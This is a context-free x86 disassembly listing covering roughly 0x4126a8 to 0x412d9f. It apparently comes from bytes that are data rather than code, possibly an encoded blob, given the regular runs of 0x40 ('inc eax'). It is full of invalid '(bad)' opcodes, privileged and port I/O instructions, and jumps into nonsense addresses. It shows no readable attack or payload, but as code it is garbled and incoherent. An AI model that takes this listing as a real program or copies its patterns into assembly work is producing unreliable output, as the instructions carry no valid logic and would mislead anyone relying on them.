  4126a8:	inc    eax
  4126a9:	inc    eax
  4126aa:	inc    eax
  4126ab:	inc    edi
  4126ac:	inc    eax
  4126ad:	and    eax,0x62ec3c40
  4126b2:	lods   al,BYTE PTR ds:[esi]
  4126b3:	lds    eax,FWORD PTR [eax-0x5f]
  4126b6:	cmc    
  4126b7:	dec    ebx
  4126b8:	inc    ebp
  4126b9:	sbb    edi,DWORD PTR ds:0x5e464046
  4126bf:	test   DWORD PTR [eax+ebx*4],ecx
  4126c2:	jle    0x41271a
  4126c4:	push   esp
  4126c5:	mov    ds:0x62cd5640,eax
  4126ca:	arpl   WORD PTR [eax+0x40],ax
  4126cd:	inc    eax
  4126ce:	inc    eax
  4126cf:	inc    eax
  4126d0:	inc    eax
  4126d1:	inc    eax
  4126d2:	inc    eax
  4126d3:	inc    eax
  4126d4:	inc    eax
  4126d5:	rol    BYTE PTR [eax+0x22],cl
  4126d8:	inc    eax
  4126d9:	xor    eax,0xafac0040
  4126de:	inc    eax
  4126df:	xor    ecx,DWORD PTR gs:[ebp-0x7e]
  4126e3:	sub    BYTE PTR ds:0x40404041,al
  4126e9:	inc    eax
  4126ea:	inc    eax
  4126eb:	inc    eax
  4126ec:	int3   
  4126ed:	jne    0x41272f
  4126ef:	inc    eax
  4126f0:	add    dh,BYTE PTR [ebx]
  4126f2:	es dec ecx
  4126f4:	retf   
  4126f5:	retf   
  4126f6:	inc    ebx
  4126f7:	push   eax
  4126f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126f9:	mov    ch,0x5c
  4126fb:	dec    ebx
  4126fc:	mov    eax,0x26403047
  412701:	addr16 inc eax
  412703:	fadd   DWORD PTR [eax]
  412705:	inc    ecx
  412706:	or     BYTE PTR [eax-0x60],al
  412709:	xchg   ebx,eax
  41270a:	xor    eax,0x474aaafa
  41270f:	inc    eax
  412710:	mov    edi,0x50fa6845
  412715:	mov    eax,0x40c10040
  41271a:	inc    eax
  41271b:	inc    eax
  41271c:	inc    eax
  41271d:	add    BYTE PTR [eax-0x7b],al
  412720:	dec    esp
  412721:	sub    eax,0x22d1e8f2
  412726:	pop    edi
  412727:	inc    ebx
  412728:	inc    eax
  412729:	jle    0x412745
  41272b:	inc    ebx
  41272c:	rol    cl,cl
  41272e:	mov    al,0x90
  412730:	inc    eax
  412731:	stos   DWORD PTR es:[edi],eax
  412732:	pop    ecx
  412733:	xor    eax,0x40404040
  412738:	inc    eax
  412739:	inc    eax
  41273a:	inc    eax
  41273b:	inc    eax
  41273c:	inc    DWORD PTR [eax-0x8]
  41273f:	jge    0x4127a6
  412741:	loop   0x412783
  412743:	push   ebx
  412744:	repz cmp BYTE PTR [eax-0x58],dl
  412748:	xor    eax,0x6ea04872
  41274d:	sub    BYTE PTR [ecx+0x40f54f2c],ch
  412753:	xor    eax,0x92f610f7
  412758:	mov    ecx,0x592140a3
  41275d:	push   eax
  41275e:	out    dx,eax
  41275f:	(bad)  
  412761:	rol    DWORD PTR [eax+0x23],0xd1
  412765:	inc    eax
  412766:	inc    eax
  412767:	inc    eax
  412768:	inc    eax
  412769:	inc    eax
  41276a:	inc    eax
  41276b:	inc    eax
  41276c:	inc    eax
  41276d:	inc    eax
  41276e:	inc    eax
  41276f:	add    eax,0x504211b9
  412774:	inc    esp
  412775:	add    DWORD PTR [edi],esi
  412777:	inc    edx
  412778:	hlt    
  412779:	mov    esp,0xa140435d
  41277e:	inc    eax
  41277f:	inc    eax
  412780:	inc    eax
  412781:	inc    eax
  412782:	inc    eax
  412783:	inc    eax
  412784:	inc    eax
  412785:	inc    eax
  412786:	add    BYTE PTR [edx+0x43],dh
  412789:	gs or  eax,0x7e40332c
  41278f:	sbb    edx,esp
  412791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412792:	imul   eax,DWORD PTR [esi+0x4],0x40
  412796:	inc    eax
  412797:	inc    eax
  412798:	inc    eax
  412799:	inc    eax
  41279a:	inc    eax
  41279b:	and    eax,0x40404040
  4127a0:	and    eax,0xa8664538
  4127a5:	add    al,BYTE PTR [edi+0x40]
  4127a8:	pop    edx
  4127a9:	mov    edi,0xc842f248
  4127ae:	test   DWORD PTR [eax+0x40],eax
  4127b1:	inc    eax
  4127b2:	inc    eax
  4127b3:	inc    eax
  4127b4:	inc    eax
  4127b5:	inc    eax
  4127b6:	inc    eax
  4127b7:	inc    eax
  4127b8:	inc    eax
  4127b9:	inc    eax
  4127ba:	arpl   WORD PTR [edx],cx
  4127bc:	cmp    eax,0x43beca05
  4127c1:	inc    eax
  4127c2:	das    
  4127c3:	jne    0x412788
  4127c5:	gs inc eax
  4127c7:	inc    eax
  4127c8:	inc    eax
  4127c9:	inc    eax
  4127ca:	inc    eax
  4127cb:	inc    eax
  4127cc:	rol    DWORD PTR [eax+0x40],0x2c
  4127d0:	add    eax,0x26774090
  4127d5:	jp     0x41279d
  4127d7:	(bad)  
  4127d8:	retf   0x40ff
  4127db:	out    0xf7,eax
  4127dd:	inc    edx
  4127de:	sub    ebx,DWORD PTR [edi]
  4127e0:	dec    esp
  4127e1:	inc    ebx
  4127e2:	jmp    0x4127d2
  4127e4:	and    al,BYTE PTR [eax-0x8]
  4127e7:	mov    al,0x15
  4127e9:	shr    ebp,1
  4127eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ec:	mov    ebx,0x4562f034
  4127f1:	lahf   
  4127f2:	rol    BYTE PTR [edx+0x404033],cl
  4127f8:	inc    eax
  4127f9:	inc    eax
  4127fa:	inc    eax
  4127fb:	inc    eax
  4127fc:	inc    eax
  4127fd:	inc    eax
  4127fe:	push   0x79f41564
  412803:	mov    ds:0x78611a3,eax
  412808:	ds cmp al,0xe8
  41280b:	rol    DWORD PTR [ecx+0x2a],1
  41280e:	inc    ebx
  41280f:	data16 stc 
  412811:	inc    ecx
  412812:	lods   al,BYTE PTR ds:[esi]
  412813:	into   
  412814:	and    DWORD PTR [ebx],esi
  412816:	xor    eax,0x418962ee
  41281b:	cdq    
  41281c:	jo     0x412873
  41281e:	xor    al,0x68
  412820:	pop    esi
  412821:	inc    eax
  412822:	inc    eax
  412823:	inc    eax
  412824:	inc    eax
  412825:	inc    eax
  412826:	inc    eax
  412827:	inc    eax
  412828:	inc    eax
  412829:	inc    eax
  41282a:	inc    eax
  41282b:	ret    
  41282c:	inc    ebx
  41282d:	fsub   DWORD PTR [edx]
  41282f:	aad    0x28
  412831:	add    eax,0xa9304234
  412836:	es mov edi,0x33406612
  41283c:	add    BYTE PTR [edx-0x13af94f3],bh
  412842:	xchg   esp,eax
  412843:	dec    edx
  412844:	inc    edi
  412845:	pop    ds
  412846:	gs xchg edx,eax
  412848:	adc    eax,0x85354105
  41284d:	lods   al,BYTE PTR ds:[esi]
  41284e:	adc    dl,BYTE PTR [eax+eax*2]
  412851:	inc    eax
  412852:	inc    eax
  412853:	inc    eax
  412854:	inc    eax
  412855:	inc    eax
  412856:	int3   
  412857:	jne    0x412899
  412859:	inc    edx
  41285a:	dec    eax
  41285b:	or     DWORD PTR [eax+0x40abb943],eax
  412861:	inc    ebx
  412862:	out    dx,al
  412863:	cmp    al,0xc5
  412865:	nop
  412866:	cmp    bh,BYTE PTR [ebx+0x40f8d454]
  41286c:	inc    ecx
  41286d:	pushf  
  41286e:	gs jo  0x412879
  412871:	inc    esp
  412872:	sbb    DWORD PTR [esp+eax*2-0x601c6bbd],ebx
  412879:	inc    eax
  41287a:	add    cl,al
  41287c:	inc    eax
  41287d:	inc    eax
  41287e:	inc    eax
  41287f:	inc    eax
  412880:	add    BYTE PTR [eax+0x48],al
  412883:	xor    eax,0x98d1243d
  412888:	dec    eax
  412889:	or     BYTE PTR ds:0x3458c342,bh
  41288f:	pusha  
  412890:	bound  ebx,QWORD PTR [edi+0xa9441c3]
  412896:	shl    ebp,cl
  412898:	cmp    BYTE PTR [eax+0x40],al
  41289b:	inc    eax
  41289c:	inc    eax
  41289d:	inc    eax
  41289e:	inc    eax
  41289f:	inc    eax
  4128a0:	inc    eax
  4128a1:	inc    DWORD PTR [eax+0x8]
  4128a4:	sbb    BYTE PTR [ebx+0x42],cl
  4128a7:	leave  
  4128a8:	mov    al,0x34
  4128aa:	inc    eax
  4128ab:	lahf   
  4128ac:	stos   DWORD PTR es:[edi],eax
  4128ad:	clc    
  4128ae:	xor    BYTE PTR [edi+eax*1-0x71],cl
  4128b2:	and    eax,0x34424308
  4128b7:	adc    eax,0x40404040
  4128bc:	inc    eax
  4128bd:	inc    eax
  4128be:	inc    eax
  4128bf:	inc    eax
  4128c0:	inc    eax
  4128c1:	inc    eax
  4128c2:	inc    ecx
  4128c3:	hlt    
  4128c4:	push   edx
  4128c5:	lahf   
  4128c6:	or     eax,0x43cb63a9
  4128cb:	scas   al,BYTE PTR es:[edi]
  4128cc:	and    ecx,DWORD PTR [eax-0x10]
  4128cf:	mov    esp,0x573057cb
  4128d4:	and    al,0x5f
  4128d6:	bound  edx,QWORD PTR ds:0xa27ca1b8
  4128dc:	jmp    0x40818de0
  4128e1:	inc    eax
  4128e2:	inc    eax
  4128e3:	inc    eax
  4128e4:	inc    eax
  4128e5:	inc    eax
  4128e6:	inc    eax
  4128e7:	add    cl,cl
  4128e9:	dec    ecx
  4128ea:	add    DWORD PTR [edi+0x2d],0x9c104854
  4128f1:	mov    BYTE PTR [esi-0x7b],0x20
  4128f5:	and    edi,ebx
  4128f7:	push   ebx
  4128f8:	dec    ebp
  4128f9:	inc    eax
  4128fa:	inc    eax
  4128fb:	inc    eax
  4128fc:	inc    eax
  4128fd:	inc    eax
  4128fe:	inc    eax
  4128ff:	and    eax,0x68404040
  412904:	adc    eax,0x8871a60
  412909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41290a:	adc    al,0x9c
  41290c:	add    al,dh
  41290e:	lock dec ebx
  412910:	lahf   
  412911:	test   al,0xcd
  412913:	add    eax,0xa1aba662
  412918:	cs inc eax
  41291a:	inc    eax
  41291b:	leave  
  41291c:	and    BYTE PTR [eax+0x40],al
  41291f:	inc    eax
  412920:	inc    eax
  412921:	inc    eax
  412922:	inc    eax
  412923:	inc    eax
  412924:	inc    eax
  412925:	inc    eax
  412926:	inc    eax
  412927:	mov    ecx,0x12f4399
  41292c:	mov    BYTE PTR [eax],bh
  41292e:	nop
  41292f:	inc    ebx
  412930:	and    cl,0x51
  412933:	stos   DWORD PTR es:[edi],eax
  412934:	sub    ecx,DWORD PTR [edx+0x52]
  412937:	rcr    BYTE PTR [eax+0x40404040],cl
  41293d:	inc    eax
  41293e:	inc    eax
  41293f:	rol    DWORD PTR [eax+0x40],0x7
  412943:	dec    esp
  412944:	xor    BYTE PTR [eax+0x4],al
  412947:	test   eax,0xb5a593dc
  41294c:	sub    BYTE PTR [eax+0x43],al
  41294f:	inc    ebp
  412950:	ins    DWORD PTR es:[edi],dx
  412951:	fist   WORD PTR [ebp+0x6d]
  412954:	adc    DWORD PTR [eax+0x5d],eax
  412957:	stos   DWORD PTR es:[edi],eax
  412958:	iret   
  412959:	dec    ecx
  41295a:	bound  esi,QWORD PTR [ecx+0x50]
  41295d:	inc    edx
  41295e:	xor    al,0x40
  412960:	inc    eax
  412961:	add    BYTE PTR [eax+0x40],al
  412964:	inc    eax
  412965:	inc    eax
  412966:	inc    eax
  412967:	inc    eax
  412968:	inc    edi
  412969:	cmc    
  41296a:	inc    eax
  41296b:	cmp    edi,esi
  41296d:	inc    esi
  41296e:	clc    
  41296f:	inc    ebp
  412970:	stos   DWORD PTR es:[edi],eax
  412971:	inc    ecx
  412972:	jo     0x4129c5
  412974:	adc    esp,DWORD PTR [edi]
  412976:	stos   BYTE PTR es:[edi],al
  412977:	mov    BYTE PTR [ebx+eax*2+0x5b],al
  41297b:	loope  0x4129b8
  41297d:	push   esp
  41297e:	dec    edi
  41297f:	xor    BYTE PTR [ebx+0x30],al
  412982:	mov    al,0x6b
  412984:	ja     0x4129c6
  412986:	inc    eax
  412987:	inc    eax
  412988:	inc    eax
  412989:	inc    eax
  41298a:	inc    eax
  41298b:	inc    eax
  41298c:	inc    eax
  41298d:	inc    eax
  41298e:	inc    eax
  41298f:	bound  edi,QWORD PTR [esi+0x6a78426e]
  412995:	gs lahf 
  412997:	pop    eax
  412998:	shl    BYTE PTR [ebx+0x30],1
  41299b:	inc    edi
  41299c:	mov    al,0x7e
  41299e:	or     DWORD PTR ds:0x8550c3a8,esi
  4129a4:	add    BYTE PTR [ecx],ah
  4129a6:	pop    ds
  4129a7:	inc    ebx
  4129a8:	inc    esi
  4129a9:	pusha  
  4129aa:	inc    edx
  4129ab:	inc    ebx
  4129ac:	fidiv  DWORD PTR [edi+0x62b52609]
  4129b2:	icebp  
  4129b3:	nop
  4129b4:	inc    eax
  4129b5:	inc    eax
  4129b6:	inc    eax
  4129b7:	inc    eax
  4129b8:	inc    eax
  4129b9:	inc    eax
  4129ba:	int3   
  4129bb:	jne    0x4129fd
  4129bd:	inc    ebx
  4129be:	push   edx
  4129bf:	pop    ds
  4129c0:	cmp    BYTE PTR [esi-0x5aa9ba24],ah
  4129c6:	mov    eax,ds:0x7d663441
  4129cb:	inc    edx
  4129cc:	inc    ebx
  4129cd:	sub    DWORD PTR [eax-0x1],ebp
  4129d0:	inc    eax
  4129d1:	in     eax,0x89
  4129d3:	mov    cl,0xd1
  4129d5:	mov    ch,0x25
  4129d7:	or     DWORD PTR [eax+0x66],edx
  4129da:	bound  ebx,QWORD PTR [ecx+0x10]
  4129dd:	fbstp  TBYTE PTR ds:0x92a4411f
  4129e3:	inc    ebp
  4129e4:	inc    eax
  4129e5:	add    cl,al
  4129e7:	inc    eax
  4129e8:	inc    eax
  4129e9:	inc    eax
  4129ea:	inc    eax
  4129eb:	add    BYTE PTR [eax-0x23],al
  4129ee:	shl    DWORD PTR [eax+eax*1+0x61],1
  4129f2:	fisttp WORD PTR [ecx+0x25]
  4129f5:	xor    al,0xd8
  4129f7:	das    
  4129f8:	jg     0x4129e2
  4129fa:	lods   eax,DWORD PTR ds:[esi]
  4129fb:	inc    eax
  4129fc:	inc    eax
  4129fd:	inc    eax
  4129fe:	inc    eax
  4129ff:	inc    eax
  412a00:	inc    eax
  412a01:	inc    eax
  412a02:	inc    eax
  412a03:	inc    DWORD PTR [eax-0x23]
  412a06:	dec    eax
  412a07:	sub    BYTE PTR [esi],0x42
  412a0a:	or     DWORD PTR [ebx-0x5e],esp
  412a0d:	rol    BYTE PTR [edx+0x41],1
  412a10:	popa   
  412a11:	popa   
  412a12:	pop    ds
  412a13:	aad    0xd
  412a15:	inc    ebp
  412a16:	icebp  
  412a17:	inc    edi
  412a18:	push   ds
  412a19:	dec    ecx
  412a1a:	(bad)  
  412a1b:	(bad)  
  412a1c:	dec    ebp
  412a1d:	cmp    DWORD PTR [esp-0x63],eax
  412a21:	mov    eax,ds:0x40404093
  412a26:	inc    eax
  412a27:	inc    eax
  412a28:	inc    eax
  412a29:	inc    eax
  412a2a:	inc    eax
  412a2b:	inc    eax
  412a2c:	inc    eax
  412a2d:	dec    edi
  412a2e:	jmp    0x4955:0xbb744258
  412a35:	inc    esi
  412a36:	stc    
  412a37:	test   al,0xb1
  412a39:	inc    edi
  412a3a:	adc    ah,cl
  412a3c:	adc    cl,BYTE PTR [eax-0x60]
  412a3f:	adc    DWORD PTR [esi-0x7b],ebp
  412a42:	xchg   edx,eax
  412a43:	dec    ebp
  412a44:	mov    edi,0x4040403d
  412a49:	inc    eax
  412a4a:	inc    eax
  412a4b:	inc    eax
  412a4c:	inc    eax
  412a4d:	inc    eax
  412a4e:	add    BYTE PTR ds:0x5a43aba4,al
  412a54:	loop   0x412a7c
  412a56:	ret    
  412a57:	inc    ecx
  412a58:	inc    ecx
  412a59:	adc    al,0x90
  412a5b:	popa   
  412a5c:	scas   eax,DWORD PTR es:[edi]
  412a5d:	sbb    DWORD PTR [ebx+eiz*8-0x3f],eax
  412a61:	cs inc eax
  412a63:	inc    eax
  412a64:	inc    eax
  412a65:	inc    eax
  412a66:	inc    eax
  412a67:	inc    eax
  412a68:	and    eax,0x73404040
  412a6d:	inc    ebx
  412a6e:	and    dl,BYTE PTR [ebx-0x3a]
  412a71:	clc    
  412a72:	dec    esp
  412a73:	bound  eax,QWORD PTR [ebx+0x58]
  412a76:	inc    ecx
  412a77:	jo     0x412a69
  412a79:	sahf   
  412a7a:	gs inc edx
  412a7c:	rcr    DWORD PTR [esi],1
  412a7e:	mov    eax,ds:0x4015621f
  412a83:	inc    eax
  412a84:	inc    eax
  412a85:	inc    eax
  412a86:	inc    eax
  412a87:	inc    eax
  412a88:	inc    eax
  412a89:	inc    eax
  412a8a:	inc    eax
  412a8b:	inc    eax
  412a8c:	test   al,0xf0
  412a8e:	enter  0x467a,0x70
  412a92:	ret    0x416a
  412a95:	inc    ebx
  412a96:	cs dec eax
  412a98:	loope  0x412ab9
  412a9a:	dec    edi
  412a9b:	repz jne 0x412ae0
  412a9e:	xor    edi,edi
  412aa0:	xor    al,0x40
  412aa2:	inc    eax
  412aa3:	inc    eax
  412aa4:	inc    eax
  412aa5:	inc    eax
  412aa6:	inc    eax
  412aa7:	rol    DWORD PTR [eax+0x40],0x70
  412aab:	jg     0x412aa7
  412aad:	imul   esi,DWORD PTR [ecx+0x1f2192bb],0x62
  412ab4:	pushf  
  412ab5:	rol    DWORD PTR [ebx],cl
  412ab7:	sub    BYTE PTR [edx-0x349de5ac],al
  412abd:	inc    esp
  412abe:	inc    edx
  412abf:	inc    edx
  412ac0:	loopne 0x412ae3
  412ac2:	mov    bl,0x40
  412ac4:	inc    eax
  412ac5:	add    BYTE PTR [eax+0x40],al
  412ac8:	inc    eax
  412ac9:	inc    eax
  412aca:	inc    eax
  412acb:	inc    eax
  412acc:	inc    ebp
  412acd:	stos   BYTE PTR es:[edi],al
  412ace:	arpl   WORD PTR [ecx],si
  412ad0:	ss out 0x69,eax
  412ad3:	push   es
  412ad4:	cmp    al,0x19
  412ad6:	add    BYTE PTR [eax-0x3c],ah
  412ad9:	sub    dh,BYTE PTR [ebx-0x9]
  412adc:	xor    DWORD PTR ds:0x40404040,esi
  412ae2:	inc    eax
  412ae3:	inc    eax
  412ae4:	inc    eax
  412ae5:	inc    eax
  412ae6:	inc    eax
  412ae7:	inc    eax
  412ae8:	imul   eax,DWORD PTR [ebp+0x62],0xffffff8b
  412aec:	lock push esi
  412aee:	loopne 0x412b31
  412af0:	std    
  412af1:	in     eax,0x47
  412af3:	adc    ah,BYTE PTR [edi-0x6d]
  412af6:	arpl   WORD PTR [esp+eiz*2+0x42],cx
  412afa:	test   al,ah
  412afc:	fdivr  QWORD PTR [edi]
  412afe:	ret    
  412aff:	inc    ecx
  412b00:	or     BYTE PTR [edx+0x43],al
  412b03:	imul   esp,ebx,0x40404059
  412b09:	inc    eax
  412b0a:	inc    eax
  412b0b:	inc    eax
  412b0c:	int3   
  412b0d:	jne    0x412b4f
  412b0f:	cmp    dl,bh
  412b11:	int3   
  412b12:	mov    cl,0x90
  412b14:	push   edx
  412b15:	aas    
  412b16:	xchg   ebp,eax
  412b17:	inc    esi
  412b18:	or     BYTE PTR [eax],dl
  412b1a:	sbb    BYTE PTR [eax],dl
  412b1c:	out    0x6b,al
  412b1e:	inc    ecx
  412b1f:	outs   dx,DWORD PTR ds:[esi]
  412b20:	bound  eax,QWORD PTR [edx+eax*2+0x43]
  412b24:	push   es
  412b25:	and    edx,DWORD PTR [eax-0x58]
  412b28:	inc    esp
  412b29:	and    DWORD PTR [ecx],esi
  412b2b:	shl    edi,1
  412b2d:	(bad)  [esi+0x4207269e]
  412b33:	inc    eax
  412b34:	add    cl,al
  412b36:	inc    eax
  412b37:	inc    eax
  412b38:	inc    eax
  412b39:	inc    eax
  412b3a:	add    BYTE PTR [eax+0x1a],al
  412b3d:	ret    0x48e1
  412b40:	retf   
  412b41:	lds    ebp,FWORD PTR [eax+0x44a74140]
  412b47:	push   ecx
  412b48:	bound  ecx,QWORD PTR [edi+0x7a]
  412b4b:	adc    edi,edi
  412b4d:	test   DWORD PTR [ecx-0x37],esp
  412b50:	pop    ss
  412b51:	inc    edx
  412b52:	and    ch,BYTE PTR [ebp+0x40]
  412b55:	inc    eax
  412b56:	inc    eax
  412b57:	inc    eax
  412b58:	inc    eax
  412b59:	inc    eax
  412b5a:	inc    eax
  412b5b:	inc    eax
  412b5c:	inc    DWORD PTR [eax-0x20]
  412b5f:	out    dx,eax
  412b60:	adc    edi,edi
  412b62:	ror    BYTE PTR [eax-0x67],1
  412b65:	sub    eax,0x4323a341
  412b6a:	repz cmp eax,0x3d43ab28
  412b70:	pop    ebp
  412b71:	mov    bl,0xc8
  412b73:	ret    
  412b74:	inc    eax
  412b75:	inc    eax
  412b76:	inc    eax
  412b77:	inc    eax
  412b78:	inc    eax
  412b79:	inc    eax
  412b7a:	inc    eax
  412b7b:	inc    eax
  412b7c:	inc    eax
  412b7d:	inc    eax
  412b7e:	les    edi,FWORD PTR [edi+0x6ea1cf30]
  412b84:	pop    edx
  412b85:	inc    ebp
  412b86:	and    BYTE PTR ds:0x1c1d426c,al
  412b8c:	test   eax,0x47c87864
  412b91:	jcxz   0x412bc7
  412b94:	mov    esp,0x8544840c
  412b99:	sbb    esi,esp
  412b9b:	sahf   
  412b9c:	pop    eax
  412b9d:	bound  ecx,QWORD PTR fs:[eax+0x40404043]
  412ba4:	inc    eax
  412ba5:	inc    eax
  412ba6:	inc    eax
  412ba7:	inc    eax
  412ba8:	inc    eax
  412ba9:	add    al,bl
  412bab:	and    DWORD PTR [ebx+0x7f],eax
  412bae:	or     eax,ebp
  412bb0:	ret    
  412bb1:	nop
  412bb2:	push   ds
  412bb3:	lock repz addr16 xor al,0x4f
  412bb8:	inc    ebp
  412bb9:	sub    eax,0x175fe352
  412bbe:	bound  ebp,QWORD PTR [edi+0x11]
  412bc1:	inc    ebx
  412bc2:	ds mov edi,0x6ededcfb
  412bc8:	mov    cl,dl
  412bca:	bound  ebp,QWORD PTR [edx+0x53]
  412bcd:	aas    
  412bce:	lds    eax,FWORD PTR [eax+0x40]
  412bd1:	inc    eax
  412bd2:	inc    eax
  412bd3:	inc    eax
  412bd4:	inc    eax
  412bd5:	and    eax,0x62404040
  412bda:	bound  ebp,QWORD PTR [ebp+0x4415e16a]
  412be0:	iret   
  412be1:	sbb    BYTE PTR [ecx-0x46],al
  412be4:	je     0x412c36
  412be6:	push   ebx
  412be7:	arpl   WORD PTR [edx],sp
  412be9:	dec    esp
  412bea:	adc    BYTE PTR [ebp-0x19],ah
  412bed:	and    DWORD PTR [edi],ebx
  412bef:	dec    ebp
  412bf0:	mov    edi,0x2fc37d62
  412bf5:	adc    DWORD PTR [eax+0x40],eax
  412bf8:	inc    eax
  412bf9:	inc    eax
  412bfa:	inc    eax
  412bfb:	inc    eax
  412bfc:	inc    eax
  412bfd:	inc    eax
  412bfe:	inc    eax
  412bff:	inc    eax
  412c00:	pop    esp
  412c01:	mov    esp,0x4163c8bf
  412c06:	(bad)  [edi+0x7d]
  412c09:	inc    eax
  412c0a:	mov    esi,0x24434c48
  412c0f:	dec    eax
  412c10:	push   ebx
  412c11:	mov    al,0xdc
  412c13:	sub    eax,0xa399300d
  412c18:	lahf   
  412c19:	adc    ebp,edx
  412c1b:	sub    bl,cl
  412c1d:	push   0x1c00e276
  412c22:	inc    edx
  412c23:	test   al,0x40
  412c25:	inc    edi
  412c26:	inc    eax
  412c27:	inc    eax
  412c28:	inc    eax
  412c29:	inc    eax
  412c2a:	inc    eax
  412c2b:	inc    eax
  412c2c:	rol    DWORD PTR [eax+0x40],0x43
  412c30:	fldenv fs:[ebx+0x57]
  412c34:	adc    BYTE PTR [eax],al
  412c36:	test   DWORD PTR [eax-0x3c4f5df],ecx
  412c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c3d:	aaa    
  412c3e:	inc    ebx
  412c3f:	sti    
  412c40:	leave  
  412c41:	xor    DWORD PTR [eax+0x44],ecx
  412c44:	add    eax,0xa939909c
  412c49:	mov    edi,0x40004040
  412c4e:	inc    eax
  412c4f:	inc    eax
  412c50:	inc    eax
  412c51:	inc    eax
  412c52:	inc    eax
  412c53:	addr16 sub al,0xcb
  412c56:	(bad)
  412c59:	addr16 jb 0x412ca0
  412c5c:	fidivr DWORD PTR [edi-0x1ee5bc9c]
  412c62:	push   ebp
  412c63:	cmp    ch,cl
  412c65:	sub    bh,BYTE PTR [edi+0x53bbddd1]
  412c6b:	or     dl,BYTE PTR [ebx+0x40]
  412c6e:	inc    eax
  412c6f:	inc    eax
  412c70:	inc    eax
  412c71:	inc    eax
  412c72:	inc    eax
  412c73:	inc    eax
  412c74:	inc    eax
  412c75:	inc    eax
  412c76:	inc    eax
  412c77:	adc    al,BYTE PTR [eax-0x55]
  412c7a:	jne    0x412c8e
  412c7c:	imul   DWORD PTR [eax+0x4c00b0ee]
  412c82:	mov    ecx,0x40a81165
  412c87:	inc    eax
  412c88:	inc    eax
  412c89:	inc    eax
  412c8a:	inc    eax
  412c8b:	inc    eax
  412c8c:	int3   
  412c8d:	jne    0x412ccf
  412c8f:	inc    esp
  412c90:	inc    edi
  412c91:	aaa    
  412c92:	mov    ebp,0x103f7363
  412c97:	sub    al,0x2
  412c99:	mov    eax,0x45229243
  412c9e:	mov    esp,0x41c2b8d8
  412ca3:	(bad)  
  412ca4:	xor    dh,BYTE PTR [ebx]
  412ca6:	inc    edx
  412ca7:	inc    eax
  412ca8:	add    cl,al
  412caa:	inc    eax
  412cab:	inc    eax
  412cac:	inc    eax
  412cad:	inc    eax
  412cae:	add    BYTE PTR [eax-0x3b],al
  412cb1:	push   edx
  412cb2:	test   BYTE PTR [edi-0x52],0x43
  412cb6:	dec    edx
  412cb7:	daa    
  412cb8:	dec    ebx
  412cb9:	adc    DWORD PTR [edi+0x24],ecx
  412cbc:	data16 and bl,BYTE PTR [edi+0x40b4fec4]
  412cc3:	inc    eax
  412cc4:	inc    eax
  412cc5:	inc    eax
  412cc6:	inc    eax
  412cc7:	inc    eax
  412cc8:	inc    eax
  412cc9:	inc    eax
  412cca:	inc    DWORD PTR [eax-0x5c]
  412ccd:	fs ins BYTE PTR es:[edi],dx
  412ccf:	and    al,BYTE PTR [ebx+0x41]
  412cd2:	dec    eax
  412cd3:	add    dl,BYTE PTR ds:0x1044d147
  412cd9:	lahf   
  412cda:	cmp    al,0x7e
  412cdc:	retf   
  412cdd:	test   esp,edx
  412cdf:	mov    eax,ds:0x62d6a104
  412ce4:	inc    edx
  412ce5:	inc    ebx
  412ce6:	aaa    
  412ce7:	dec    edx
  412ce8:	push   ss
  412ce9:	bound  eax,QWORD PTR [eax+0x40]
  412cec:	inc    eax
  412ced:	inc    eax
  412cee:	inc    eax
  412cef:	inc    eax
  412cf0:	inc    eax
  412cf1:	inc    eax
  412cf2:	inc    eax
  412cf3:	inc    eax
  412cf4:	aad    0x10
  412cf6:	inc    eax
  412cf7:	nop
  412cf8:	sub    DWORD PTR [ebx-0x5fff1e85],esp
  412cfe:	and    ah,bh
  412d00:	daa    
  412d01:	dec    ebx
  412d02:	mov    ebp,0x7005ee24
  412d07:	inc    ebx
  412d08:	aaa    
  412d09:	mov    eax,ds:0x40404040
  412d0e:	inc    eax
  412d0f:	inc    eax
  412d10:	inc    eax
  412d11:	inc    eax
  412d12:	add    BYTE PTR [ecx+0x62],dl
  412d15:	inc    esp
  412d16:	int    0x62
  412d18:	shr    DWORD PTR [ebp-0x69],1
  412d1b:	lahf   
  412d1c:	ins    BYTE PTR es:[edi],dx
  412d1d:	sub    al,0x41
  412d1f:	(bad)  
  412d20:	call   0xc0928e90
  412d25:	aam    0x40
  412d27:	inc    eax
  412d28:	inc    eax
  412d29:	inc    eax
  412d2a:	inc    eax
  412d2b:	inc    eax
  412d2c:	and    eax,0x42404040
  412d31:	dec    edi
  412d32:	add    BYTE PTR [edi-0x1d],dl
  412d35:	lahf   
  412d36:	(bad)  
  412d37:	int    0x30
  412d39:	inc    eax
  412d3a:	jp     0x412da6
  412d3c:	ja     0x412d8a
  412d3e:	inc    ax
  412d40:	inc    eax
  412d41:	inc    eax
  412d42:	inc    eax
  412d43:	inc    eax
  412d44:	inc    eax
  412d45:	inc    eax
  412d46:	inc    eax
  412d47:	inc    eax
  412d48:	inc    eax
  412d49:	inc    ebp
  412d4a:	xor    al,0x40
  412d4c:	mov    ss,WORD PTR [ecx-0x13ec601]
  412d52:	sub    al,BYTE PTR [eax+0x28]
  412d55:	not    BYTE PTR [ecx+0x2]
  412d58:	arpl   WORD PTR [edx+esi*2-0x73],ax
  412d5c:	inc    eax
  412d5d:	inc    eax
  412d5e:	inc    eax
  412d5f:	inc    eax
  412d60:	inc    eax
  412d61:	inc    eax
  412d62:	rol    DWORD PTR [eax+0x40],0x42
  412d66:	cmp    DWORD PTR [ecx+0x5d2c5d33],esp
  412d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6d:	xor    BYTE PTR [ecx-0x2d46a9bb],al
  412d73:	gs cmp eax,0x51213644
  412d79:	out    0xc5,eax
  412d7b:	jle    0x412d3e
  412d7d:	bound  eax,QWORD PTR [eax+0x40]
  412d80:	add    BYTE PTR [eax+0x40],al
  412d83:	inc    eax
  412d84:	inc    eax
  412d85:	inc    eax
  412d86:	inc    eax
  412d87:	call   0x59806003
  412d8c:	enter  0x4ea4,0x5a
  412d90:	cmp    eax,0x65ee4415
  412d95:	inc    eax
  412d96:	inc    eax
  412d97:	inc    eax
  412d98:	inc    eax
  412d99:	inc    eax
  412d9a:	inc    eax
  412d9b:	inc    eax
  412d9c:	inc    eax
  412d9d:	inc    eax
  412d9e:	inc    eax
  412d9f:	or     eax,0x49073c8c
